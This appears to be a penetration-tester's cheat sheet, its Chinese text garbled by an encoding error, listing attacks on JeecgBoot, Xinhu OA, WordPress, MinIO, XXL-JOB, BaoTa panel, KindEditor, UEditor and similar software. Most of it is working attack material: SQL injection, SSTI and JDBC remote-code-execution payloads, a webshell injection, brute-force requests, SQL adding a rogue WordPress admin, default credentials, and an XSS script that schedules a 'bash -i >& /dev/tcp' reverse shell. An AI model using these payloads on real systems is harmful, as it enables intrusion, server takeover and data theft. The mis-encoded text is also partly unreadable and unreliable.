/jeecg-boot/doc.htmlï¼Œ/jeecg-boot/swagger-ui.html #Basicè®¤è¯ jeecg/jeecg1314 /jeecg-boot/v2/api-docs rabitmq http://localhost:15672 guest/guest nacosï¼ˆæœåŠ¡æ³¨å†Œå‘ç°å’Œç»Ÿä¸€é…ç½®ä¸­å¿ƒï¼‰http://localhost:8848/nacos nacos/nacos xxl-job-adminï¼ˆåˆ†å¸ƒå¼å®šæ—¶ä»»åŠ¡ï¼‰ http://localhost:9080/xxl-job-admin admin/123456 redis ï¼ˆç¼“å­˜ï¼‰ 127.0.0.1:6379 å¯†ç ç©º ç›¸å…³æ¥å£ GET /jeecg-boot/sys/user/exportXls # å¯¼å‡ºç”¨æˆ· GET /jeecg-boot/sys/user/list # æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ GET /jeecg-boot/sxams/mysqlbackup/list # æŸ¥çœ‹æ•°æ®åº“å¤‡ä»½ GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # æ¶ˆæ¯é€šçŸ¥ GET /jeecg-boot/sys/dataSource/list #è·å–æ•°æ®åº“ç›¸å…³ä¿¡æ¯ # ä¿®æ”¹å¯†ç  PUT /jeecg-boot/sys/user/changePassword Content-Type: application/json {\"username\":\"1231222\",\"password\":\"Qwer1234!\",\"confirmpassword\":\"Qwer1234!\"} æœªæˆæƒæŸ¥è¯¢ï¼ˆå¯ä»¥æŸ¥è¯¢åˆ°ç”¨æˆ·åå’Œç”µè¯å·ç ï¼‰ /jeecg-boot/sys/user/querySysUser?username=admin æœªæˆæƒsqlæ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰ POST /jeecg-boot/jmreport/qurestSql {\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '\"} SSTIæ³¨å…¥ POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 Host: 192.168.90.1:3100 Origin: http://192.168.90.1:3100 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 123 {\"sql\":\"select 'result: ${ ex(\\\"open -a calculator.app \\\") }' \"} JDBC POST /jeecgboot/jmreport/testConnection HTTP/1.1 Host: 192.168.90.1:3100 Content-Length: 383 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://192.168.90.1:3100 Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close { \"id\": \"1\", \"code\": \"dataSource1\", \"dbType\": \"H2\", \"dbDriver\": \"org.h2.Driver\", \"dbUrl\": \"jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\\u000A$$\", \"dbName\": \"test\", \"dbUsername\": \"sa\", \"dbPassword\": \"\", \"connectTimes\": 5 } æ–‡ä»¶è¯»å– POST /fzsubway/jmreport/testConnection HTTP/1.1 Host: xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=38218C16E4022462F885161A2E0C4CCB; AntiLeech=2682583728; SECKEY_ABVK=z1hNWlXhJNRMfOWBcwIZZqelCyMfKElivU/svwCZzjo%3D; BMAP_SECKEY=2__IGYvkyC_isfYhAQNJUfG9ZmlOSJqO86jO158B6xt7DpDdl8vU_XEcAj1by2qFkzxQFvskvrzECqqBlu9Bp-PaZ6EPwYr595XK1qAjEYPDz8cu5m5ae-DSxRqaD1mP0lkcfUAFG7-lY-IRd3zSq0Oir1xRhOafcZ76YwQT0CqsHHw1iW-kvMhXjHvOhZId; JSESSIONID=2D86CE0B3842FC0E36528E7EFD223D1E Connection: close Content-Type: application/json Content-Length: 350 { \"id\":\"1\", \"code\":\"select * from information_schema.tables\", \"dbType\":\"jndi\", \"dbDriver\":\"com.mysql.cj.jdbc.Driver\", \"dbUrl\":\"jdbc:mysql://localhost:3307/test?allowLoadLocalInfile=yes\", \"dbName\":\"information_schema\", \"dbUsername\":\"fileread_/etc/passwd\", \"dbPassword\":\"password\", \"connectionTimaes\":\"5\" } ä¿¡å‘¼OA åå°æ–‡ä»¶ä¸Šä¼  è¿˜åŸæ–‡ä»¶ GET /task.php?m=qcloudCos|runt&a=run&fileid=19 åå°é…ç½®æ–‡ä»¶getshell /index.php?a=changestyle&m=geren&d=system&ajaxbool=true&style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2F é‡æ–°ç™»é™† /index.php?a=savecong&m=cog&d=system&ajaxbool=true&rnd=705961 ä»£ç æ‰§è¡Œ POST /index.php 1=phpinfo(); æ³¨æ„ï¼šç”¨äº†è¿™ä¸ªåå°ä¸»é¡µä¼šå‡ºç°é—®é¢˜ åå°SSRF ä¿å­˜è¯·æ±‚ POST /index.php?a=setsave&m=xinhu&d=main&ajaxbool=true HTTP/1.1 host=http://onj888.dnslog.cn å‘é€è¯·æ±‚ GET /index.php?a=testsends&m=xinhu&d=main&ajaxbool=true HTTP/1.1 å‰å°å­˜å‚¨å‹XSSæ¼æ´ POST /?m=login&a=getoption&ajaxbool=true&num=aaaa\\ HTTP/1.1 Client-ip:111',web=0x3C7363726970743E616C65727428787373293C2F7363726970743E -- web= [XSSä»£ç çš„hexç¼–ç ]+[(tabé”®)--(tabé”®)] æŸ¥çœ‹æ—¥å¿—å¤„è§¦å‘xssä»£ç  Joomla åå° /administrator æ¼æ´ CVE-2023-23752 POC Joomla! æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ /api/index.php/v1/config/application?public=true /api/v1/config/application?public=true ã€æ¼æ´å¤ç° CVE-2021-23132ã€‘Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ - StarCi - åšå®¢å›­ https://www.cnblogs.com/starci/p/15174896.html Exploit Database Search https://www.exploit-db.com/search?q=joomla ã€æ¼æ´åˆ†æã€‘CVE-2017-14596ï¼šJoomla! LDAPæ³¨å…¥å¯¼è‡´ç™»å½•è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆå«æ¼”ç¤ºè§†é¢‘ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° https://www.anquanke.com/post/id/86899 Drupal ç‰ˆæœ¬å· /install.php X-Generator: Drupal 8 (https://www.drupal.org) /core/CHANGELOG.txt Wordpress ç›®å½•éå† /wp-content/uploads æ‰¾æ’ä»¶æ¼æ´ /wp-content/plugins/wp-automatic/downloader.php?link=file:///var/www/podwoskizbryantb9_gmail.com.1305.w1261/site49107/wp-content/uploads/2020/01/index.php æ‰«å¤‡ä»½æ–‡ä»¶/éª‘é©¬ å…³é”®æ–‡ä»¶ wp-config.phpï¼šæ•°æ®åº“è¿æ¥ xmlrpcæ¼æ´ çˆ†ç ´è´¦å¯† çˆ†ç ´ç«¯å£ WordPress WordPress xmlrpc.php æ¼æ´åˆ©ç”¨ - ç®€ä¹¦ (jianshu.com) æ²¡å•¥ç”¨ï¼Œæˆ‘åªèƒ½æ”¶åˆ°dnslog åå°getshell æŠ€æœ¯è®¨è®º | WordPressåå°æ‹¿Shellæ–°å§¿æ€ https://mp.weixin.qq.com/s/SHO8FcH4Oz80BkgG-K8ULg è¡¥å……ï¼šæ’ä»¶å¸‚åœºç›´æ¥å®‰è£…æœ‰æ¼æ´çš„æ’ä»¶ åª’ä½“-æ–°å¢æ¡£æ¡ˆï¼ˆä½ç‰ˆæœ¬ï¼‰ ä¿®æ”¹ä¸»é¢˜/æ’ä»¶æ¨¡æ¿æ–‡ä»¶ ä¸Šä¼ æ–°ä¸»é¢˜å‹ç¼©åŒ…/æ–°æ’ä»¶å‹ç¼©åŒ…ï¼ˆæ’ä»¶å¯ä»¥ç›´æ¥ä¼ phpæ–‡ä»¶ï¼‰ # å³ä½¿æ˜¾ç¤ºPCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signatureæˆ–è€…è§£å‹ç›®å½•æ— æƒé™ /wp-content/uploads ï¼ˆç›®å½•éå†ï¼‰ # æ­£å¸¸ä¸Šä¼  /wp-content/upgrade/ä¸»é¢˜ /wp-content/plugins/æ’ä»¶ # webshell /wp-content/themes/twentytwentythree/patterns/config.php æ’ä»¶å¸‚åœºå®‰è£…æœ‰æ¼æ´çš„æ’ä»¶ wpscan docker pull wpscanteam/wpscan docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate u å¯†ç é‡ç½®æ“ä½œ å“¥æ–¯æ‹‰çš„æ•°æ®åº“åªèƒ½æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ å†°èçš„æ•°æ®åº“è¦è‡ªå·±è¿›è¡Œsqlæ“ä½œ select * from wp_users limit 0,20 update wp_users set user_pass=md5(\"test\") where user_login=\"oY_Zb5ADu0lV2QM0KarP6y6MrLus\" æ–°å¢ç®¡ç†å‘˜ -- æ’å…¥æ–°ç”¨æˆ·è®°å½•åˆ° wp_users è¡¨ INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name) VALUES ('admin', MD5('123456'), 'admin@example.com', NOW(), 0, 'admin'); -- è·å–æ–°ç”¨æˆ·çš„ ID SET @user_id = LAST_INSERT_ID(); -- æ’å…¥æ–°ç”¨æˆ·è§’è‰²åˆ° wp_usermeta è¡¨ INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}'), (@user_id, 'wp_user_level', '10'); å¦‚ä½•æ‰¾åˆ°wordpressç‰ˆæœ¬ https://target.com/feed https://target.com/?feed=rss2 ctrl+F generator å¦‚ä½•æ‰¾åˆ°æ’ä»¶ç‰ˆæœ¬ https://target.com/wp-content/plugins/PLUGINNAME/readme.txt https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT https://target.com/wp-content/plugins/PLUGINNAME/README.txt https://target.com/wp-content/plugins/PLUGINNAME/README.TXT å¦‚ä½•æ‰¾åˆ°ä¸»é¢˜ç‰ˆæœ¬ https://target.com/wp-content/themes/THEMENAME/style.css https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file) å¦‚æœæ‚¨å‘ç°è¿‡æ—¶çš„æ ¸å¿ƒ/æ’ä»¶/ä¸»é¢˜ï¼Œè¯·åœ¨https://wpscan.comæ‰¾åˆ°æ¼æ´åˆ©ç”¨ æŸ¥æ‰¾æ—¥å¿—æ–‡ä»¶ http://target.com/wp-content/debug.log è·å–ç½‘ç«™ä¸Šçš„ç”¨æˆ·å http://target.com/?author=1 æˆ–è€… http://target.com/wp-json/wp/v2/users http://target.com/?rest_route=/wp/v2/users çˆ†ç ´åå°è´¦å·å¯†ç  POST /wp-login.php HTTP/1.1 Host: target.com log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1 æˆ–è€… POST /xmlrpc.php HTTP/1.1 Host: target.com wp.getUsersBlogs admin BRUTEFORCE_IN_HERE çˆ†ç ´ç«¯å£ POST /xmlrpc.php HTTP/1.1 Host: target.com pingback.pinghttp://yourip:porthttps://target.com> æ³¨å†Œå¯ç”¨ http://example.com/wp-login.php?action=register /wp-json/oembed/1.0/proxy - SSRF å°è¯•è®¿é—®https://xxxxxxxx.com/wp-json/oembed/1.0/proxy? url= xxxxxxxxxxxxå’ŒWorpressâ½¹ç«™å¯èƒ½ ä¼šå‘æ‚¨æå‡ºè¯·æ±‚ã€‚ /wp-json ç«¯ç‚¹æš´éœ²æ¥â¼â½‚æ¡£ è®¿é—®https://www.xxxx.com/wp-jsonç«¯â¼ä¼šè·å¾—æœ‰å…³â½¹ç«™restapiçš„æ¥â¼åˆ—è¡¨ã€‚ è¿™ä¸ªnamespcaseåº”è¯¥å’Œæ’ä»¶åæœ‰å…³ï¼Œæ­£å¸¸æ¥è¯´æ˜¯å…¬å¼€æš´éœ²çš„ç«¯ç‚¹ï¼Œä½†æ˜¯â¼€èˆ¬ä¼šä»¥æ’ä»¶åç§°ä½œä¸ºå‘½åç©ºé—´ï¼Œâ½å¦‚/wp-json/myplugin/v1/ï¼Œå†ç»“åˆwpscanæ‰«æçš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥é’ˆå¯¹æ’ä»¶çš„å†å²æ¼æ´è¿›â¾æ’æŸ¥ã€‚ é’ˆå¯¹æ’ä»¶æœ‰ä¸¤ä¸ªè¦æ£€æŸ¥çš„ï¼š 1. é€šâ½¤æ’ä»¶çš„å†å²æ¼æ´ 2. â¾ƒå®šä¹‰æ’ä»¶çš„æ¥â¼ å› æ­¤åœ¨æµ‹è¯•çš„æ—¶å€™å…ˆæ ¹æ®wpscanæµ‹â¼€éæ’ä»¶å†å²æ¼æ´ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å»æ’æŸ¥å“ªäº›å‘½åç©ºé—´ä¸åŒ…å«åœ¨é€šâ½¤æ’ä»¶å†…ï¼Œé‚£ä¹ˆè¿™ äº›æ’ä»¶å¯èƒ½æ˜¯â¾ƒå®šä¹‰çš„æ’ä»¶ï¼Œé‚£ä¹ˆå†å»â¼€ä¸ªä¸ªæ ¹æ®æ¥â¼æ ¼å¼å»æµ‹è¯•æ¥â¼ã€‚å½“â¾ƒå®šä¹‰æ’ä»¶çš„æ¥â¼æµ‹è¯•å®Œäº†è¿˜æ˜¯æ²¡æœ‰æ¼æ´ï¼Œ åˆ™å†çœ‹çœ‹é€šâ½¤æ’ä»¶çš„æ¥â¼æ˜¯å¦æœ‰â¼†æ¬¡å¼€å‘ä¹‹ç±»çš„ã€‚ Spring actuatorç«¯ç‚¹ swaggeræ¥å£ rce æƒé™ç»•è¿‡ Apache Druid kafaraååºåˆ—åŒ– Redis Redisæ¼æ´ | Khaz's Blog (fgtbnc.github.io) VUE ä¸»è¦æ˜¯æ¥å£æµ‹è¯• go-vue-admin Gin-Vue-adminå‚ç›´è¶Šæƒæ¼æ´ä¸ä»£ç åˆ†æ-CVE-2022-21660 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· vue-typescript-admin èŠ‹é“ /admin-api/infra/file-config/page?pageNo=1&pageSize=10 # æ–‡ä»¶å­˜å‚¨é…ç½® jeeplus ä»£ç å®¡è®¡å…¥é—¨ä¹‹Jeeplusä»£ç å®¡è®¡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· jeeplusåå°æœ‰druidï¼Œå¯ä»¥å°è¯•æœªæˆæƒè®¿é—® https://xxx/api/jeeplus/druid/index.html https://xxx/api/jeeplus/swagger-ui.html Minio--9000ç«¯å£ é»˜è®¤å£ä»¤ minioadmin/minioadmin CVE-2023-28432 MinIOä¿¡æ¯æ³„éœ²æ¼æ´ æœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹æ®ŠHTTPè¯·æ±‚å³å¯è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­åŒ…æ‹¬MINIO_SECRET_KEYå’ŒMINIO_ROOT_PASSWORDï¼Œé€ æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æ”»å‡»è€…ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•MinIOã€‚ æ³¨æ„ç‚¹ï¼š åœ¨MinIOåœ¨å¯åŠ¨æ—¶ä¼šä»ç¯å¢ƒå˜é‡ä¸­è¯»å–ç”¨æˆ·é¢„è®¾çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå¦‚æœçœç•¥åˆ™é»˜è®¤è´¦å·å¯†ç ä¸ºminioadmin/minioadminã€‚ å¦å¤–ï¼Œå¦‚æœå¼€å¯åŠ¨Minioæ—¶æ²¡æœ‰è®¾ç½®MINIO_ROOT_USERå’ŒMINIO_ROOT_PASSWORDï¼Œé‚£ä¹ˆMinioä½¿ç”¨é»˜è®¤è´¦å·å¯†ç minioadminï¼Œè¿™æ—¶å€™å†åšä¿¡æ¯æ³„éœ²éªŒè¯ä¼šå‘ç°è¯»å–ä¸åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œåˆ™æ¨æ–­å­˜åœ¨é»˜è®¤å£ä»¤ã€‚ /api/v1/check-version å¯ä»¥æŸ¥çœ‹MinIOç‰ˆæœ¬ POC POST /minio/bootstrap/v1/verify HTTP/1.1 Host: User-Agent: Mozilla/5.0 Upgrade-Insecure-Requests: 1 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: en-US;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 æ ¹æ®POCæ”¹åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼ŒåŒ…å«å†…ç½‘IPæ³„éœ²ç­‰ã€‚ æ‹¿åˆ°è´¦å¯†è¿›å…¥åå°ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨MinIOçš„è‡ªæ›´æ–°è¾¾åˆ°RCE MinIOè‡ªæ›´æ–°RCE CVE-2021-21287--SSRF: å®¹å™¨ä¸äº‘çš„ç¢°æ’â€”â€”ä¸€æ¬¡å¯¹MinIOçš„æµ‹è¯• | ç¦»åˆ«æ­Œ ssrf-CVE-2021-21287 POST /minio/webrpc HTTP/1.1 HOST:IP {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\":\"test\"},\"method\":\"web.LoginSTS\"} åå¼¹shellï¼Ÿ xxl-job XXL-JOBåœ¨çœŸå®æ”»é˜²ä¸‹çš„æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº https://xz.aliyun.com/t/13899?time__1311=mqmxnQG%3DF40mD%2F8iiQGk8wdAKTqQqcDDt4D&alichlgref=https%3A%2F%2Fi.hacking8.com%2F XXL-JOB-adminï¼ˆé»˜è®¤ç«¯å£8080ï¼‰ å¼±å£ä»¤+åå°å‘½ä»¤æ‰§è¡Œ admin/123456 ä»»åŠ¡ç®¡ç† - æ–°å¢ è¿è¡Œæ¨¡å¼ä½¿ç”¨ GLUE(Shell) æ“ä½œå¤„é€‰æ‹©Glue IDEå†™å…¥å‘½ä»¤æ‰§è¡Œè„šæœ¬ #/bin/bash cmd æ“ä½œå¤„ç‚¹å‡»æ‰§è¡Œå³å¯ æœªæˆæƒRCE XxlJob GET /api è€æ›²æ–°å”±ä¹‹XXL-JOBæœªæˆæƒHessian2ååºåˆ—åŒ–è°ƒè¯•åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-[Webå®æˆ˜] è®°ä¸€æ¬¡æ›²æŠ˜çš„ä¸å‡ºç½‘XXL-JOB API Hessianååºåˆ—åŒ–åˆ°Getshell XxlJob >= 2.2.0 XXL-JOB-executeï¼ˆé»˜è®¤ç«¯å£9999ï¼‰ æŒ‡çº¹POST /run æ³¨æ„ï¼šæ¯å‘é€ä¸€æ¬¡ä¸‹é¢çš„æ•°æ®åŒ…ï¼Œéƒ½éœ€è¦æ›´æ¢jobidï¼Œå› ä¸ºæ˜¯é€šè¿‡jobidä½œä¸ºç´¢å¼•æ¥æ‰§è¡Œjobçš„ POST /run HOST: xxx:9999 Content-Type: application/json XXL-JOB-ACCESS-TOKEN: default_token # é»˜è®¤Tokenè®¤è¯ç»•è¿‡ { \"jobId\": 1, \"executorHandler\": \"demoJobHandler\", \"executorParams\": \"demoJobHandler\", \"executorBlockStrategy\": \"COVER_EARLY\", \"executorTimeout\": 0, \"logId\": 1, \"logDateTime\": 1586629003729, \"glueType\": \"GLUE_SHELL\", # GLUE_SHELLå¯¹åº”Linuxç³»ç»Ÿï¼ŒGLUE_POWERSHELLå¯¹åº”Windowsç³»ç»Ÿ \"glueSource\": \"å‘½ä»¤\", \"glueUpdatetime\": 1586699003758, \"broadcastIndex\": 0, \"broadcastTotal\": 0 } å®å¡”--8888ç«¯å£ https://www.t00ls.com/viewthread.php?tid=67047&highlight=%E5%AE%9D%E5%A1%94 https://www.t00ls.com/viewthread.php?tid=68409&highlight=%E5%AE%9D%E5%A1%94 phpmyadmin pmaæœªæˆæƒè®¿é—®æ¼æ´ å½±å“ç‰ˆæœ¬ å®å¡”Linuxé¢æ¿7.4.2ç‰ˆæœ¬ å®å¡”Linuxæµ‹è¯•ç‰ˆ7.5.13 Windowsé¢æ¿6.8ç‰ˆæœ¬ payload ip:888/pma é»˜è®¤phpmyadminè·¯å¾„ ip:888/phpmyadmin_éšæœºå­—ç¬¦ä¸² æ—¥å¿—XSS+CSRFå¯¼è‡´çš„è®¡åˆ’ä»»åŠ¡RCE å½±å“ç‰ˆæœ¬ 6.xç‰ˆæœ¬è®°å½•äº†éªŒè¯ç é”™è¯¯å¹¶å­˜å…¥æ•°æ®åº“å½“ä¸­ï¼ˆè€ç‰ˆæœ¬ï¼‰ payload 1. åœ¨è¯·æ±‚ä¸­æ’å…¥xss 2. jså†…å®¹å¦‚ä¸‹ function addTask(TaskName, execTime, ip, port) { var execShell = 'bash -i >& /dev/tcp/192.168.1.14/7777 0>&1'; # è¦æ‰§è¡Œçš„å‘½ä»¤ execShell = encodeURIComponent(execShell); var params = 'name=' + TaskName + '&type=minute-n&where1=' + execTime + '&hour=&minute=&week=&sType=toShell&sBody=' + execShell + '&sName=&backupTo=localhost&save=&urladdress=undefined'; var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=AddCrontab', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send(params); } function execTask(TaskName) { var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=GetCrontab', true); xhr.send(); xhr.onload = function () { if (this.readyState == 4 && this.status == 200) { var res = JSON.parse(this.responseText); if (res[0].name == TaskName) { var TaskID = res[0].id.toString(); var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=StartTask', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); var params = 'id=' + TaskID; xhr.send(params); delTask(res[0].id); console.log(res[0].id); return res[0].id; } } } } function delTask(TaskID) { var params = 'id=' + TaskID.toString(); var xhr = new XMLHttpRequest(); xhr.open('POST', '/crontab?action=DelCrontab', false); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send(params); } var TaskName = Math.random().toString(36).substring(7); addTask(TaskName, '5', '1.1.1.1', '53'); execTask(TaskName); æ•°æ®åº“ç›¸å…³ é»˜è®¤ä¿å­˜ä½ç½® # Windows C:/BtSoft/panel/data # Linux /server/panel/data | æ–‡ä»¶ | ä½œç”¨ | | :-----------: | :--------------------: | | default.db | æ•°æ®åº“ï¼Œä¿å­˜ç™»å½•ä¿¡æ¯ | | port.pl | æ–‡æœ¬ï¼Œä¿å­˜å¼€æ”¾ç«¯å£ | | admin_path.pl | æ–‡æœ¬ï¼Œä¿å­˜åå°ç›®å½• | | default.pl | æ–‡æœ¬ï¼Œä¿å­˜é»˜è®¤ç™»é™†å¯†ç  | default.db è´¦å·å¯†ç å­˜åœ¨usersè¡¨ä¸­ å¯¹äºpasswordçš„åŠ å¯†æ–¹å¼ä¸º md5(md5(md5(password)+'_bt.cn')+salt) å…¶ä¸­passwordä¸ºæ˜æ–‡å¯†ç ï¼Œsaltåœ¨usersä¸­çš„saltå­—æ®µ å¯†ç åŠ å¯†è„šæœ¬å¦‚ä¸‹ import hashlib # MD5 hashing with additional strings as per the provided pattern original_text = \"5fa0a808\" additional_string1 = \"_bt.cn\" additional_string2 = \"GqYa0loI4RPm\" # First MD5 hash first_md5 = hashlib.md5(original_text.encode()).hexdigest() # Second MD5 hash with additional string 1 second_md5 = hashlib.md5((first_md5 + additional_string1).encode()).hexdigest() # Final MD5 hash with additional string 2 final_md5 = hashlib.md5((second_md5 + additional_string2).encode()).hexdigest() print(final_md5) æ—¥å¿—ä¿å­˜åœ¨logsè¡¨é‡Œ adminer ä¸€æ¬¡adminerä¹‹æ—… - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Adminer( ç¼–è¾‘å™¨ Fckeditor https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80.md kindeditor æ–‡ä»¶ä¸Šä¼ xss ä¸Šä¼ è·¯å¾„ /kindeditor/asp/upload_json.asp?dir=file /kindeditor/asp.net/upload_json.ashx?dir=file /kindeditor/jsp/upload_json.jsp?dir=file /kindeditor/php/upload_json.php?dir=file POST /admin/kindeditor/asp/upload_json.asp?dir=file HTTP/1.1 Host: xxx Content-Length: 210 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5 Connection: close ------WebKitFormBoundaryZ4ILit8qr5XXhdT5 Content-Disposition: form-data; name=\"imgFile\"; filename=\"1.html\" Content-Type: text/html ------WebKitFormBoundaryZ4ILit8qr5XXhdT5-- åˆ—ç›®å½• /kindeditor/php/file_manager_json.php?path=/ F12ä¿®æ”¹åç¼€é‡å‘½åæ–‡ä»¶getshell Ueditor SSRF /ueditor/jsp/getRemoteImage.jsp?upfile=url /ueditor/jsp/controller.jsp?action=catchimage&source[]=url /ueditor/php/controller.php?action=catchimage&source[]=url æ–‡ä»¶ä¸Šä¼  XSS Ueditor é»˜è®¤æ”¯æŒä¸Šä¼  xml ï¼šconfig.jsonå¯ä»¥æŸ¥çœ‹æ”¯æŒä¸Šä¼ çš„åç¼€ /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json ä¸Šä¼ PATH /ueditor/xxx/controller.php?action=uploadfile /ueditor/xxx/controller.php?action=uploadimage æ•°æ®åŒ… Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Length: 325 ------WebKitFormBoundary9zWBDx6vAJHGTpAl Content-Disposition: form-data; name=\"upfile\"; filename=\"1.xml\" Content-Type: image/png alert(1); ------WebKitFormBoundary9zWBDx6vAJHGTpAl é—®é¢˜ .netä¸‹GetShell æœåŠ¡å™¨ä¸Šå­˜æ”¾åä¸º666.jpgçš„å›¾ç‰‡é©¬ POST /æ›¿æ¢æ¼æ´URLåœ°å€æ‹¼æ¥/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 49 source[]=http://æ›¿æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨å¼€å¯httpæœåŠ¡çš„URLåœ°å€/666.jpg?.aspx å¸†è½¯ å®‰å…¨æ¼æ´å£°æ˜- FineReportå¸®åŠ©æ–‡æ¡£ - å…¨é¢çš„æŠ¥è¡¨ä½¿ç”¨æ•™ç¨‹å’Œå­¦ä¹ èµ„æ–™ èƒ½å¤Ÿä½œä¸ºè‡´è¿œOAçš„ç»„ä»¶ å¸†è½¯V8 å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-å¸†è½¯æŠ¥è¡¨ V8.0 ç»„åˆæ‹³æ¼æ´åˆ†æåŠå¤ç° å¸†è½¯æŠ¥è¡¨ç»„åˆæ‹³æ¼æ´åˆ†æ å¸†è½¯æŠ¥è¡¨ V8 get_geo_json ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2018-04757 - Vuls Wiki FineReportï¼ˆå¸†è½¯ï¼‰æŠ¥è¡¨ç³»ç»Ÿç›®å½•éå†æ¼æ´å¤ç°å’Œç”¨ç®€æ˜“è¿‡æ»¤å™¨å¤„ç† - ç°ä¿¡ç½‘ï¼ˆè½¯ä»¶å¼€å‘åšå®¢èšåˆï¼‰ å¸†è½¯V9 å¸†è½¯ï¼ˆFineReport) V9ä»»æ„æ–‡ä»¶è¦†ç›–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº å¸†è½¯V10 ååºåˆ—åŒ– webroot/decision/remote/design/channel # è·¯å¾„ WebReport/ReportServer Blade-X å›¾æ ‡ å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-spring-blade 